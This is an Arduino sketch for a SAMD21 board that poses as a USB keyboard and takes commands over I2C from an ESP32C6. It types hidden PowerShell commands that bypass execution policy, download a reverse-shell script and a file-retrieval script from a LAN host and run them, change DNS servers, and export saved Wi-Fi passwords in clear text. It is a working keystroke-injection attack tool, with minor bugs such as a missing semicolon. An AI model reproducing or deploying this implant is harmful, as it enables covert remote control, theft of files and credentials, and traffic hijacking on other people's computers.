#include <Wire.h>
#include <Keyboard.h>
// #include "lib/Keyboard.h"
#include "lib/simple-instructions.h"
// #include "lib/complex-instructions.h"

const int I2C_MASTER_ADDR = 0x08; // I2C address of the ESP32C6 (C6 board)
const int ledPin = 13;

void setup()
{
  Wire.begin(I2C_MASTER_ADDR);  // Initialize I2C as slave
  Keyboard.begin();             // Initialize the Keyboard library
  Wire.onReceive(receiveEvent); // Register the receive event handler
  Serial.begin(115200);         // Initialize Serial for debugging
  // Serial.println("SAMD21 ready to receive commands over I2C");
}

void loop()
{
  // The loop is empty because all the work is done in the receiveEvent function
}

void receiveEvent(int bytes)
{
  String command = "";
  while (Wire.available())
  {
    char c = Wire.read();
    command += c;
  }
  // Serial.println("Received command: " + command);
  executeCommand(command);
}

void executeCommand(String command)
{
  if (command == "RS") // Reverse Shell
  {
    openPowerShell();
    // killall();
    // openPowerShellAdmin();

    // These requires custom configuration for deployment to retrive the script
    String payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://192.168.0.30/reverse_shell.ps1' -OutFile 'C:\\Users\\Public\\reverse_shell.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\reverse_shell.ps1'\"";
    Keyboard.println(payload);
  }
  else if (command == "FR") // File Retriever
  {
    openPowerShell();
    // These requires custom configuration for deployment to retrive the script
    String payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://192.168.0.30/file_retriver.ps1' -OutFile 'C:\\Users\\Public\\reverse_shell.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\reverse_shell.ps1'\"";
    Keyboard.println(payload);
  }
  else if (command == "DNS") // Set DNS Server
  {
    // Set the DNS server address
    String payload = "Set-DNSClientServerAddress \"InterfaceAlias\" –ServerAddresses (\"preferred-DNS-address\", \"alternate-DNS-address\")";
    Keyboard.println(payload);
  }
  else if (command == "Wpass") // Retrieve Wi-Fi Passwords
  {
    String payload = "netsh wlan export profile key=clear folder=C:\\"
    Keyboard.println(payload);
  }
  // Add more commands as needed
}

// Response [To be implemented]: void sendResponse(String response)
// Response [To be implemented]: {
// Response [To be implemented]:   Wire.beginTransmission(I2C_MASTER_ADDR);
// Response [To be implemented]:   Wire.write(response.c_str(), response.length());
// Response [To be implemented]:   Wire.endTransmission();
// Response [To be implemented]:   Serial.println("Sent response to ESP32C6: " + response);
// Response [To be implemented]: }